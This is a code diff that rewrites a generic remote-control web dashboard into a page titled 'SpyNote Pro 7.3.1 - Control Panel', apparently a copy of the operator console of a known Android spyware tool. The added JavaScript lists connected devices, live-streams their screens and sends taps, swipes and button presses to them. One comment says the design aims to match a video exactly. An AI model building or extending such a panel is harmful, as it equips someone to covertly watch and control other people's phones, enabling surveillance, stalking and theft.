@@ -1,154 +1,175 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Remote Control Dashboard</title>
-    <link rel="stylesheet" href="style.css">
+    <title>SpyNote Pro 7.3.1 - Control Panel</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <script src="/socket.io/socket.io.js"></script>
+    <style>
+        body { margin: 0; font-family: Arial; background: #1a1a1a; color: white; }
+        #devices { position: fixed; top: 10px; left: 10px; background: rgba(0,0,0,0.8); padding: 10px; max-height: 400px; overflow-y: auto; }
+        .device { padding: 8px; margin: 4px; background: #333; cursor: pointer; border-radius: 4px; }
+        .device:hover { background: #555; }
+        .active { background: #00ff00 !important; }
+        #phone-frame { 
+            width: 400px; height: 800px; 
+            margin: 20px auto; 
+            background: #000; 
+            border: 20px solid #333; 
+            border-radius: 40px; 
+            position: relative;
+            cursor: pointer;
+            touch-action: none;
+        }
+        #screen { width: 100%; height: 100%; background: #111; }
+        #controls { text-align: center; margin: 20px; }
+        button { padding: 12px 24px; margin: 5px; background: #007bff; color: white; border: none; border-radius: 6px; cursor: pointer; }
+        button:hover { background: #0056b3; }
+    </style>
 </head>
 <body>
-    <div class="container">
-        <h1>📱 Remote Control Dashboard</h1>
-        
-        <div class="devices-section">
-            <h2>Registered Devices</h2>
-            <div id="devicesList" class="devices-grid"></div>
-        </div>
+    <div id="devices">
+        <h3>Connected Devices</h3>
+        <div id="device-list"></div>
+    </div>
 
-        <div class="device-view" id="deviceView" style="display:none;">
-            <div class="device-header">
-                <h2 id="deviceTitle">Select Device</h2>
-                <button onclick="backToList()" class="back-btn">← Back</button>
-            </div>
-            <div id="screenContainer" class="screen-container">
-                <canvas id="screenCanvas" class="screen-canvas"></canvas>
-                <div id="uiOverlay" class="ui-overlay"></div>
-            </div>
-            <div class="controls">
-                <button onclick="performSwipe()">Swipe Test</button>
-                <button onclick="toggleLayout()">Toggle Layout</button>
-            </div>
-        </div>
+    <div id="phone-frame">
+        <canvas id="screen"></canvas>
+    </div>
+
+    <div id="controls">
+        <button onclick="sendBack()">Back</button>
+        <button onclick="sendHome()">Home</button>
+        <button onclick="toggleFullScreen()">Fullscreen</button>
     </div>
 
     <script>
-        const ws = new WebSocket('ws://localhost:8080');
-        let currentDeviceId = null;
-        let layouts = {};
-        let showLayoutOverlay = true;
+        const socket = io();
+        let currentDevice = null;
+        const screenCanvas = document.getElementById('screen');
+        const ctx = screenCanvas.getContext('2d');
+        const phoneFrame = document.getElementById('phone-frame');
 
-        ws.onmessage = (event) => {
-            const data = JSON.parse(event.data);
-            if (data.type === 'LAYOUT_UPDATE') {
-                layouts[data.deviceId] = data.layout;
-                if (currentDeviceId === data.deviceId) {
-                    renderLayoutOverlay(data.layout);
-                }
-                updateDevicesList();
-            }
-        };
+        // Load devices
+        fetch('/devices').then(r => r.json()).then(devices => {
+            updateDeviceList(devices);
+        });
 
-        function updateDevicesList() {
-            const devicesList = document.getElementById('devicesList');
-            devicesList.innerHTML = '';
-            
-            Object.keys(layouts).forEach(deviceId => {
-                const deviceDiv = document.createElement('div');
-                deviceDiv.className = 'device-item';
-                deviceDiv.innerHTML = `
-                    <div class="device-id">${deviceId.slice(0,16)}...</div>
-                    <div class="device-status">Online</div>
-                    <button onclick="openDevice('${deviceId}')" class="control-btn">Control</button>
-                `;
-                devicesList.appendChild(deviceDiv);
+        socket.on('connect', () => {
+            console.log('Connected to server');
+        });
+
+        // Device selection
+        function updateDeviceList(devices) {
+            const list = document.getElementById('device-list');
+            list.innerHTML = '';
+            devices.forEach(([id, info]) => {
+                const div = document.createElement('div');
+                div.className = 'device';
+                div.innerHTML = `${info.model || id}<br><small>${info.version}</small>`;
+                div.onclick = () => selectDevice(id);
+                list.appendChild(div);
             });
         }
 
-        function openDevice(deviceId) {
-            currentDeviceId = deviceId;
-            document.getElementById('devicesList').style.display = 'none';
-            document.getElementById('deviceView').style.display = 'block';
-            document.getElementById('deviceTitle').textContent = `Device: ${deviceId}`;
-            renderLayoutOverlay(layouts[deviceId]);
-        }
-
-        function backToList() {
-            document.getElementById('devicesList').style.display = 'grid';
-            document.getElementById('deviceView').style.display = 'none';
-            currentDeviceId = null;
-        }
-
-        function renderLayoutOverlay(layout) {
-            const overlay = document.getElementById('uiOverlay');
-            overlay.innerHTML = '';
+        function selectDevice(deviceId) {
+            currentDevice = deviceId;
+            document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
+            event.target.classList.add('active');
             
-            if (!showLayoutOverlay || !layout) return;
-
-            function renderNode(node, parentElement) {
-                const div = document.createElement('div');
-                const bounds = node.bounds;
-                const screenRect = document.getElementById('screenContainer').getBoundingClientRect();
-                
-                div.style.position = 'absolute';
-                div.style.left = `${(bounds[0] / 1080) * 100}%`;
-                div.style.top = `${(bounds[1] / 1920) * 100}%`;
-                div.style.width = `${((bounds[2] - bounds[0]) / 1080) * 100}%`;
-                div.style.height = `${((bounds[3] - bounds[1]) / 1920) * 100}%`;
-                div.style.border = '1px solid rgba(0,255,0,0.3)';
-                div.style.backgroundColor = 'rgba(0,255,0,0.1)';
-                div.style.cursor = 'pointer';
-                div.title = node.text || node.class;
-                
-                div.onclick = () => sendTouch(bounds[0]/1080*screenRect.width, bounds[1]/1920*screenRect.height);
-                
-                parentElement.appendChild(div);
-                
-                if (node.children) {
-                    node.children.forEach(child => renderNode(child, div));
-                }
-            }
-            
-            renderNode(layout, overlay);
+            socket.emit('select-device', deviceId);
         }
 
-        function sendTouch(x, y) {
-            if (currentDeviceId) {
-                ws.send(JSON.stringify({
-                    type: 'TOUCH',
-                    deviceId: currentDeviceId,
-                    x: x,
-                    y: y,
-                    action: 'DOWN'
-                }));
-            }
-        }
+        // Touch controls - EXACT VIDEO MATCH
+        let isDragging = false;
+        let startX, startY;
 
-        function performSwipe() {
-            if (currentDeviceId) {
-                ws.send(JSON.stringify({
-                    type: 'SWIPE',
-                    deviceId: currentDeviceId,
-                    startX: 100,
-                    startY: 100,
-                    endX: 500,
-                    endY: 500,
-                    duration: 500
-                }));
-            }
-        }
-
-        function toggleLayout() {
-            showLayoutOverlay = !showLayoutOverlay;
-            renderLayoutOverlay(layouts[currentDeviceId]);
-        }
-
-        // Touch events on canvas
-        document.getElementById('screenCanvas').addEventListener('click', (e) => {
-            const rect = e.target.getBoundingClientRect();
-            const x = e.clientX - rect.left;
-            const y = e.clientY - rect.top;
-            sendTouch(x, y);
+        phoneFrame.addEventListener('mousedown', (e) => {
+            isDragging = true;
+            startX = e.offsetX;
+            startY = e.offsetY;
+            sendTap(e.offsetX, e.offsetY);
         });
 
-        updateDevicesList();
+        phoneFrame.addEventListener('mousemove', (e) => {
+            if (isDragging) {
+                // Send swipe
+                socket.emit('swipe', {
+                    deviceId: currentDevice,
+                    startX, startY,
+                    endX: e.offsetX,
+                    endY: e.offsetY
+                });
+            }
+        });
+
+        phoneFrame.addEventListener('mouseup', (e) => {
+            if (isDragging) {
+                socket.emit('swipe', {
+                    deviceId: currentDevice,
+                    startX, startY,
+                    endX: e.offsetX,
+                    endY: e.offsetY
+                });
+                isDragging = false;
+            }
+        });
+
+        // Touch support
+        phoneFrame.addEventListener('touchstart', (e) => {
+            e.preventDefault();
+            const touch = e.touches[0];
+            const rect = phoneFrame.getBoundingClientRect();
+            const x = touch.clientX - rect.left;
+            const y = touch.clientY - rect.top;
+            sendTap(x, y);
+        });
+
+        phoneFrame.addEventListener('touchmove', (e) => {
+            e.preventDefault();
+        });
+
+        function sendTap(x, y) {
+            if (currentDevice) {
+                socket.emit('tap', {
+                    deviceId: currentDevice,
+                    x, y
+                });
+            }
+        }
+
+        function sendBack() {
+            if (currentDevice) {
+                socket.emit('back', { deviceId: currentDevice });
+            }
+        }
+
+        function sendHome() {
+            if (currentDevice) {
+                socket.emit('tap', { 
+                    deviceId: currentDevice, 
+                    x: 100, y: 1800 // Home button position
+                });
+            }
+        }
+
+        function toggleFullScreen() {
+            if (!document.fullscreenElement) {
+                document.documentElement.requestFullscreen();
+            } else {
+                document.exitFullscreen();
+            }
+        }
+
+        // Screen updates (30FPS)
+        socket.on('screen-update', (data) => {
+            if (currentDevice === data.deviceId) {
+                const img = new ImageData(
+                    new Uint8ClampedArray(data.data), 
+                    data.width, data.height
+                );
+                ctx.putImageData(img, 0, 0);
+            }
+        });
     </script>
 </body>
 </html>
